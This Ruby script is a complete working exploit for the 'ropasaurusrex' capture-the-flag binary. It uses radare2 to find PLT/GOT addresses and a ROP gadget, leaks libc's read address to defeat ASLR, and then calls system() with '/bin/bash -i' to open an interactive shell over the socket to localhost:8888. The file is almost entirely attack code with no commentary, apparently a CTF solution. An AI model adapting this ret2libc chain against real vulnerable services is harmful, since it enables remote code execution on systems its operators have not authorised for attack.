require_relative 'shoe'
require 'r2pipe'
require 'json'
require 'pry'

def get_symbol_addr json, name
	json.each{|i|
		if i["name"] == name
			return i["vaddr"]
		end
	}
end

def pack_gadgets arr
	arr.pack("V*")
end



r2pbin = R2Pipe.new "./ropasaurusrex"
r2plibc = R2Pipe.new "/lib/i386-linux-gnu/libc.so.6"

binsyms = JSON.parse(r2pbin.cmd("isj"))
binreloc = JSON.parse(r2pbin.cmd("iRj"))
libcsyms = JSON.parse(r2plibc.cmd("isj"))

read_plt = get_symbol_addr binsyms, "imp.read"
write_plt = get_symbol_addr binsyms, "imp.write"
read_got = get_symbol_addr binreloc, "read"

# find the pppr
r2pbin.cmd("e rop.len = 4")
pppr = r2pbin.cmd('"/R/ pop;pop;pop;ret"').split[0].hex

# find the libc system and read addresses
system_libc = get_symbol_addr libcsyms, "system"
read_libc = get_symbol_addr libcsyms, "read"

# this is hard coded in...
vuln_addr = 0x080483F4

# find a place to write
segments = JSON.parse(r2pbin.cmd("iSj"))
target_size = 50 # big enough for our command to write in
target_perm = "w" # we need writeable
target_addr = 0
segments.each{|i|
	if i["flags"].include? target_perm and i["size"] >= target_size
		target_addr = i["vaddr"]
		break
	end
}

s = Shoe.new "localhost", 8888

padding_len = r2pbin.cmd("woO 0x41417641").to_i
command = "/bin/bash -i 2>&1"
stage1 = "A" * padding_len
stage1 = stage1 + [write_plt, pppr, 1, read_got, 4].pack("V*")
stage1 = stage1 + [read_plt, pppr, 0, target_addr, command.size + 1].pack("V*")
stage1 = stage1 + [vuln_addr].pack("V*")
s.say "#{stage1}"
sleep 0.1
s.say command + "\x00"
sleep 0.1
leak = s.recv(4).unpack("V")[0]
libc_base = leak - read_libc
resolved_system = libc_base + system_libc
stage2 = "A" * padding_len
stage2 = stage2 + [resolved_system, 0x11111111, target_addr].pack("V*")
s.say "#{stage2}"
s.tie!

